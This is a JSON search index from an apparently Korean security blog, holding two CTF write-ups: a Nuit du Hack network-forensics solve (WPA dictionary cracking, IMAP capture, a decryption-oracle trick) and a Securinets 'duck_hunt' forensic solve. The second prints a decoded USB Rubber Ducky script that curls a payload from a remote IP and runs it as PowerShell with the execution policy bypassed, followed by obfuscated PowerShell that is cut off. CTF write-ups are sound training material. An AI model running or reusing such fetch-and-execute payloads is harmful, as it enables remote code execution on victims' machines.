[
  
    {
      "title"    : "[2018_NUIT_DU_HACK_CTF] Kebab STO(350)",
      "category" : "CTF2018_NDH",
      "tags"     : "Network",
      "url"      : "/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/",
      "date"     : "2018-04-02 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Description\nThe challenge consists in finding the flag into a network capture.\nChallenge is listening on port 8888\nUrl : tcp://kebabsto.challs.malice.fr/</p>\n</blockquote>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Network 문제, Pcap 파일(<code class=\"highlighter-rouge\">kebabsto.pcapng</code>)을 확인할 수 있다. HTTP Object 를 먼저 확인했을 때, “kdsqfkpdsdf” 파일을 download 한 것을 확인.</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/1.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] HTTP Object</p>\n\n<p>save 하고, ZIP 확장자를 가지며 압축을 풀었을 때 “lkdjflknezcz”라는 tcp packet file를 획득할 수 있었다. file signature 를 통해서, 802.11 packet file임을 알 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network\n file ./kdsqfkpdsdf\n./kdsqfkpdsdf: Zip archive data, at least v2.0 to extract\n jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network\n unzip ./kdsqfkpdsdf\nArchive:  ./kdsqfkpdsdf\n  inflating: lkdjflknezcz\n jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network\n file ./lkdjflknezcz\n./lkdjflknezcz: tcpdump capture file <span class=\"o\">(</span>little-endian<span class=\"o\">)</span> - version 2.4 <span class=\"o\">(</span>802.11, capture length 65535<span class=\"o\">)</span>\n</code></pre></div></div>\n\n<p>하지만, 802.11 packet 내용에 대해서는 아래와 같이 식별할 수 있는 정보들이 존재하지 않았다. WPA 방식의 Encrypt를 사용하고 있었으며, 이를 decrypt할 필요가 보였다.\n<img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/2.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] lkdjflknezcz pcap</p>\n\n<p>802.11 packet decrypt를 위해서는 wireshark preference의 802.11 항목에 Password:SSID를 넣어주어야 하는데 이를 구하기 위해 <code class=\"highlighter-rouge\">aircrack-ng</code>과 사전파일을 이용해 WPA 방식의 인증을 풀어내었다. password = “abcdefgh” (간단하게 해결될 수 있는 부분이었는데 아래에 TCP 통신을 통해 Decrypt Message와 관련된 부분을 이용해 진행하려다 시간을 많이 허비)\n<img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/3.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] aircrack-ng</p>\n\n<p>아래와 같이, preference 에서 ssid, pw 정보를 이용해 decrypt 하겠다고 명시해준 후, packet 을 확인해보면, zip 파일의 전송을 확인할 수 있다. raw 로 type 변환 후, 확인한 결과 압축 해제시 Password 를 요구하는 것을 볼 수 있었다. (Password와 관련된 항목을 찾아내야 하는데, 이 부분에서 좀 헤맸던 것 같다.)\n<img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/4.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] 802.11 decrypt</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/5.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] 802.11 packet transfer</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/6.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] pk password</p>\n\n<p>결과적으로 첫번째, pcap file (“kebabsto”)에서 관련 항목을 찾아낼 수 있었는데, frame contains 을 통해, “flag”, “zip”, “PK” 등의 packet filtering 을 한 결과 SMTP를 통해 전송된 아래 데이터를 확인할 수 있었고, “docs.zip”라는 파일을 추가적으로 식별할 수 있었다.</p>\n\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN AUTH=LOGIN] Dovecot ready.\n1 authenticate PLAIN\n+\nAHRvbWF0ZUBkZWJpYW4ueW8AdG9tYXRlMTIz\n1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS SPECIAL-USE BINARY MOVE] Logged in\n2 ID (\"name\" \"Thunderbird\" \"version\" \"52.4.0\")\n* ID (\"name\" \"Dovecot\")\n2 OK ID completed.\n3 select \"Sent\"\n* FLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft)\n* OK [PERMANENTFLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft \\*)] Flags permitted.\n* 17 EXISTS\n* 0 RECENT\n* OK [UIDVALIDITY 1513610478] UIDs valid\n* OK [UIDNEXT 18] Predicted next UID\n3 OK [READ-WRITE] Select completed (0.001 secs).\n4 UID fetch 1:* (FLAGS)\n* 1 FETCH (UID 1 FLAGS (\\Seen))\n* 2 FETCH (UID 2 FLAGS (\\Seen))\n* 3 FETCH (UID 3 FLAGS (\\Seen))\n* 4 FETCH (UID 4 FLAGS (\\Seen))\n* 5 FETCH (UID 5 FLAGS (\\Seen))\n* 6 FETCH (UID 6 FLAGS (\\Seen))\n* 7 FETCH (UID 7 FLAGS (\\Seen))\n* 8 FETCH (UID 8 FLAGS (\\Seen))\n* 9 FETCH (UID 9 FLAGS (\\Seen))\n* 10 FETCH (UID 10 FLAGS (\\Seen))\n* 11 FETCH (UID 11 FLAGS (\\Seen))\n* 12 FETCH (UID 12 FLAGS (\\Seen))\n* 13 FETCH (UID 13 FLAGS (\\Seen))\n* 14 FETCH (UID 14 FLAGS (\\Seen))\n* 15 FETCH (UID 15 FLAGS (\\Seen))\n* 16 FETCH (UID 16 FLAGS (\\Seen))\n* 17 FETCH (UID 17 FLAGS (\\Seen))\n4 OK Fetch completed.\n5 UID fetch 17 (UID RFC822.SIZE FLAGS BODY.PEEK[HEADER.FIELDS (From To Cc Bcc Subject Date Message-ID Priority X-Priority References Newsgroups In-Reply-To Content-Type Reply-To)])\n* 17 FETCH (UID 17 RFC822.SIZE 844 FLAGS (\\Seen) BODY[HEADER.FIELDS (FROM TO CC BCC SUBJECT DATE MESSAGE-ID PRIORITY X-PRIORITY REFERENCES NEWSGROUPS IN-REPLY-TO CONTENT-TYPE REPLY-TO)] {406}\nSubject: Re: Private\nTo: salade &lt;salade@debian.yo&gt;\nReferences: &lt;6c9268e7-035b-0fa4-0486-c6624af41265@debian.yo&gt;\n &lt;5f8e93f0-9b6a-522f-f35a-3225bc919df7@debian.yo&gt;\nFrom: tomate &lt;tomate@debian.yo&gt;\nMessage-ID: &lt;9468245b-cfd1-4756-7fe4-0912efceaf9b@debian.yo&gt;\nDate: Thu, 21 Dec 2017 17:09:22 +0100\nIn-Reply-To: &lt;5f8e93f0-9b6a-522f-f35a-3225bc919df7@debian.yo&gt;\nContent-Type: text/plain; charset=utf-8\n\n)\n5 OK Fetch completed.\n6 IDLE\n+ idling\n* OK Still here\nDONE\n6 OK Idle completed.\n7 noop\n7 OK NOOP completed.\n8 UID fetch 18:* (FLAGS)\n* 17 FETCH (UID 17 FLAGS (\\Seen))\n8 OK Fetch completed.\n9 IDLE\n+ idling\nDONE\n9 OK Idle completed.\n10 append \"Sent\" (\\Seen) {2227+}\nTo: salade &lt;salade@debian.yo&gt;\nFrom: tomate &lt;tomate@debian.yo&gt;\nSubject: Private\nMessage-ID: &lt;3b6a11fe-60fb-f7b3-421e-29b5c0699eb9@debian.yo&gt;\nDate: Thu, 21 Dec 2017 17:12:57 +0100\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101\n Thunderbird/52.4.0\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"------------821D8D192BDE01EA2B1C5E07\"\nContent-Language: en-US\n\nThis is a multi-part message in MIME format.\n--------------821D8D192BDE01EA2B1C5E07\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 7bit\n\nThey also retrieved a public key and an interesting cipher text\n(attached documents).\n\nBesides, they also found a service at mydomainndh.ndh (port 55555) which\ndecrypts every text encrypted with the public key, apart from the\ninteresting one.\n\n\n--------------821D8D192BDE01EA2B1C5E07\nContent-Type: application/zip;\n name=\"docs.zip\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment;\n filename=\"docs.zip\"\n\nUEsDBAoAAAAAAFZ6lUsAAAAAAAAAAAAAAAAFABwAZG9jcy9VVAkAA8PCO1rdwjtadXgLAAEE\nAAAAAAQAAAAAUEsDBBQAAAAIALd5lUvQbcUR4wAAABABAAAPABwAZG9jcy9wdWJrZXkucGVt\nVVQJAAOawTtamsE7WnV4CwABBAAAAAAEAAAAAGXPvVaDMABA4Z2n6M7hlAoKjEmIIWDTRsQD\nbBESaKAHqBZant6f1Tve7bOsnyAmlG2OGXyhaJPg4vdZxp4StQc2QelEUvrhhBxDwDMAXMJA\niOCJJ7DhyI9Zy6iQHS91tfO3c1HK3dO8xEZeTcr/fNflBXHlicfbpSZjdOg7hL8EVolIUG76\n7EwCoO/SC1yXVlHkyb7QrT1Kaqy79PU6d+71efRANYAgdtb6EGdi3T6oocl7YS5qPca3KRig\nNxdAuW+lduwwS9WY0co4iWaxdat13Y5nqbC50BBwAI0/IWbhP/Q3UEsDBBQAAAAIAFZ6lUus\n24QeoQAAADUBAAAPABwAZG9jcy9jaXBoZXJUZXh0VVQJAAPDwjtaw8I7WnV4CwABBAAAAAAE\nAAAAABWPyREAQQgC/xuNFwL5J7bOS6pstWWJTYxoe/3qYopgqq6OQruta0ieSC8nAmvPMGJU\ndmics9wyyrkHpTRV0wVPZoYboT5GDCYmr+GHtrBhLuuGW4llFBXLTFgBbJPOEurBXQ6c0m1c\nxGlI0ZF9wq0L1SeoSkY/n+jtPLcLieaBhiYBAtmsZutOmad7MwzEiXVy4+6Z991gvMPi2ewk\n6/sBUEsBAh4DCgAAAAAAVnqVSwAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAGRvY3Mv\nVVQFAAPDwjtadXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAt3mVS9BtxRHjAAAAEAEAAA8A\nGAAAAAAAAQAAAKSBPwAAAGRvY3MvcHVia2V5LnBlbVVUBQADmsE7WnV4CwABBAAAAAAEAAAA\nAFBLAQIeAxQAAAAIAFZ6lUus24QeoQAAADUBAAAPABgAAAAAAAEAAACkgWsBAABkb2NzL2Np\ncGhlclRleHRVVAUAA8PCO1p1eAsAAQQAAAAABAAAAABQSwUGAAAAAAMAAwD1AAAAVQIAAAAA\n\n--------------821D8D192BDE01EA2B1C5E07--\n\n* 18 EXISTS\n* 1 RECENT\n10 OK [APPENDUID 1513610478 18] Append completed.\n11 noop\n11 OK NOOP completed.\n12 IDLE\n+ idling\n\n</code></pre></div></div>\n\n<p>해당 tcp frame 에는 아래와 같이, docs.zip 파일이 base64 encoding 되어 첨부되어 있는 것을 확인할 수 있으며, 이를 decode 한 뒤 동일하게 추출할 수 있었다.</p>\n\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>--------------821D8D192BDE01EA2B1C5E07\nContent-Type: application/zip;\n name=\"docs.zip\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment;\n filename=\"docs.zip\"\n\nUEsDBAoAAAAAAFZ6lUsAAAAAAAAAAAAAAAAFABwAZG9jcy9VVAkAA8PCO1rdwjtadXgLAAEE\nAAAAAAQAAAAAUEsDBBQAAAAIALd5lUvQbcUR4wAAABABAAAPABwAZG9jcy9wdWJrZXkucGVt\nVVQJAAOawTtamsE7WnV4CwABBAAAAAAEAAAAAGXPvVaDMABA4Z2n6M7hlAoKjEmIIWDTRsQD\nbBESaKAHqBZant6f1Tve7bOsnyAmlG2OGXyhaJPg4vdZxp4StQc2QelEUvrhhBxDwDMAXMJA\niOCJJ7DhyI9Zy6iQHS91tfO3c1HK3dO8xEZeTcr/fNflBXHlicfbpSZjdOg7hL8EVolIUG76\n7EwCoO/SC1yXVlHkyb7QrT1Kaqy79PU6d+71efRANYAgdtb6EGdi3T6oocl7YS5qPca3KRig\nNxdAuW+lduwwS9WY0co4iWaxdat13Y5nqbC50BBwAI0/IWbhP/Q3UEsDBBQAAAAIAFZ6lUus\n24QeoQAAADUBAAAPABwAZG9jcy9jaXBoZXJUZXh0VVQJAAPDwjtaw8I7WnV4CwABBAAAAAAE\nAAAAABWPyREAQQgC/xuNFwL5J7bOS6pstWWJTYxoe/3qYopgqq6OQruta0ieSC8nAmvPMGJU\ndmics9wyyrkHpTRV0wVPZoYboT5GDCYmr+GHtrBhLuuGW4llFBXLTFgBbJPOEurBXQ6c0m1c\nxGlI0ZF9wq0L1SeoSkY/n+jtPLcLieaBhiYBAtmsZutOmad7MwzEiXVy4+6Z991gvMPi2ewk\n6/sBUEsBAh4DCgAAAAAAVnqVSwAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAGRvY3Mv\nVVQFAAPDwjtadXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAt3mVS9BtxRHjAAAAEAEAAA8A\nGAAAAAAAAQAAAKSBPwAAAGRvY3MvcHVia2V5LnBlbVVUBQADmsE7WnV4CwABBAAAAAAEAAAA\nAFBLAQIeAxQAAAAIAFZ6lUus24QeoQAAADUBAAAPABgAAAAAAAEAAACkgWsBAABkb2NzL2Np\ncGhlclRleHRVVAUAA8PCO1p1eAsAAQQAAAAABAAAAABQSwUGAAAAAAMAAwD1AAAAVQIAAAAA\n\n--------------821D8D192BDE01EA2B1C5E07--\n</code></pre></div></div>\n\n<p>docs.zip 파일은 아래와 같이 <code class=\"highlighter-rouge\">cipherText</code>, <code class=\"highlighter-rouge\">private.pem</code> 2개의 파일을 포함하고 있었는데, cipherText 내용은 아래와 같으며, 결과적으로 문제에서 제시된 서버로, 해당 cipherText를 보낼경우, Decrypt Message를 return하는 것을 확인할 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network/docs\n nc kebabsto.challs.malice.fr 8888\nWhat message <span class=\"k\">do </span>you want to decrypt: ^C\n ✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network/docs\n <span class=\"nb\">cat</span> ./cipherText| nc kebabsto.challs.malice.fr 8888\n72873754879996948796542757182427480866384878894019674005699447004829908491467629529161961884224325941110935083467870715412599916138560976722953815670278067115980556377912852138532905866093650699880301357138301236748217037629036311469031537013958415575513723738671978421707050599317605219729945496472798064172\nWhat message <span class=\"k\">do </span>you want to decrypt:\n\nHere is the cleartext of your input :\n\n\n123360975347216093033775350245751721746535757669936\nWhat message <span class=\"k\">do </span>you want to decrypt: %\n</code></pre></div></div>\n\n<p>return 된 “123360975347216093033775350245751721746535757669936”를 hex 로 변환 후, 2글자씩 string 으로 decode 하면 아래와 같은 Password 문자열을 얻을 수 있다.</p>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Python</span> <span class=\"mf\">2.7</span><span class=\"o\">.</span><span class=\"mi\">10</span> <span class=\"p\">(</span><span class=\"n\">default</span><span class=\"p\">,</span> <span class=\"n\">Jul</span> <span class=\"mi\">15</span> <span class=\"mi\">2017</span><span class=\"p\">,</span> <span class=\"mi\">17</span><span class=\"p\">:</span><span class=\"mi\">16</span><span class=\"p\">:</span><span class=\"mi\">57</span><span class=\"p\">)</span>\n<span class=\"p\">[</span><span class=\"n\">GCC</span> <span class=\"mf\">4.2</span><span class=\"o\">.</span><span class=\"mi\">1</span> <span class=\"n\">Compatible</span> <span class=\"n\">Apple</span> <span class=\"n\">LLVM</span> <span class=\"mf\">9.0</span><span class=\"o\">.</span><span class=\"mi\">0</span> <span class=\"p\">(</span><span class=\"n\">clang</span><span class=\"o\">-</span><span class=\"mf\">900.0</span><span class=\"o\">.</span><span class=\"mi\">31</span><span class=\"p\">)]</span> <span class=\"n\">on</span> <span class=\"n\">darwin</span>\n<span class=\"n\">Type</span> <span class=\"s\">\"help\"</span><span class=\"p\">,</span> <span class=\"s\">\"copyright\"</span><span class=\"p\">,</span> <span class=\"s\">\"credits\"</span> <span class=\"ow\">or</span> <span class=\"s\">\"license\"</span> <span class=\"k\">for</span> <span class=\"n\">more</span> <span class=\"n\">information</span><span class=\"o\">.</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"s\">\"123360975347216093033775350245751721746535757669936\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"mi\">123360975347216093033775350245751721746535757669936</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"nb\">hex</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">)[</span><span class=\"mi\">2</span><span class=\"p\">:]</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span>\n<span class=\"s\">'54683173317332504073735f57307264254d306630L'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"p\">[:</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"s\">\"\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">)</span><span class=\"o\">/</span><span class=\"mi\">2</span><span class=\"p\">):</span>\n<span class=\"o\">...</span>     <span class=\"n\">result</span> <span class=\"o\">+=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">int</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">:</span><span class=\"n\">i</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"o\">+</span><span class=\"mi\">2</span><span class=\"p\">],</span><span class=\"mi\">16</span><span class=\"p\">))</span>\n<span class=\"o\">...</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">result</span>\n<span class=\"s\">'Th1s1s2P@ss_W0rd</span><span class=\"si\">%</span><span class=\"s\">M0f0'</span>\n</code></pre></div></div>\n\n<p>위에서 얻은 <code class=\"highlighter-rouge\">Th1s1s2P@ss_W0rd%M0f0</code>를 이용해 이전에 압축 해제시 password 로 인해 풀지 못했던 <code class=\"highlighter-rouge\">slkfdsflj</code> 파일의 압축을 해제하면 아래와 같이 flag를 확인할 수 있었다.</p>\n\n<p><img src=\"/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/flag.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] flag</p>\n\n<p align=\"right\"><strong>ndh2k18{M4k3M4tr10cHKa9r34T4g41n}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Securinets_CTF] duck_hunt(300)",
      "category" : "CTF2018_Securinets",
      "tags"     : "Forensic, ducky",
      "url"      : "/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/",
      "date"     : "2018-03-26 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Do you know someone who loves hunting ducks?\nLink: http://for.ctfsecurinets.com/8/unknown.bin</p>\n</blockquote>\n\n<p><img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>You can download a binary called “unknown.bin”. After download the “unknown.bin”, that is look like dummy binary.</p>\n\n<p>you need to know “duck” in exercise. that is “ducky”. ducky, which uses the mcu chip for usb and performs common operations, uses the result of the compilation “inject.bin”.(more important : “https://hakshop.com/products/usb-rubber-ducky-deluxe”)</p>\n\n<p>below site, you can decode that binary. “https://ducktoolkit.com/decoder/”\n<img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] decode site</p>\n\n<p>After Binary file decode, you can see that original “ducky code”.\n<img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode_file.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] original ducky code</p>\n\n<p>This is ducky code. you can see “http://34.240.44.38/payload.txt” about “GET url”.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>DELAY\nADELAY\nDELAY\nDELAY\n<span class=\"nb\">cd</span> / &amp; mkdir .haxor &amp; <span class=\"nb\">cd</span> .haxor &amp; <span class=\"nb\">echo</span> <span class=\"o\">(</span>curl <span class=\"nt\">-X</span> GET  http://34.240.44.38/payload.txt<span class=\"o\">)</span> <span class=\"o\">&gt;</span> file.PS1 &amp; powershell <span class=\"nt\">-ExecutionPolicy</span> ByPass <span class=\"nt\">-File</span> file.ps1\nDELAY\n\n</code></pre></div></div>\n\n<p>You can tell from the payload.txt that it is a powershell script, and seems to have a simple obfuscation. Nothing is a problem. This is “payload.txt” (powershell script)</p>\n<div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span><span class=\"o\">=</span>+<span class=\"k\">$()</span>;\n<span class=\"k\">${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n\\n<span class=\"k\">${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"o\">=</span>++<span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span>;\n<span class=\"k\">${</span><span class=\"s2\">\"}=\"</span><span class=\"p\">[</span><span class=\"s2\">\"+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"nv\">$?</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"p\">]</span><span class=\"s2\">\";\n</span><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span><span class=\"s2\">=\"\".(\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"nv\">$?</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">]);\n</span><span class=\"k\">${</span><span class=\"p\">;</span><span class=\"k\">}</span><span class=\"s2\">=\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[\"</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">\"]+\"</span><span class=\"k\">$(</span>@<span class=\"o\">{}</span><span class=\"k\">)</span><span class=\"s2\">\"[</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">]\n\"</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">(</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span 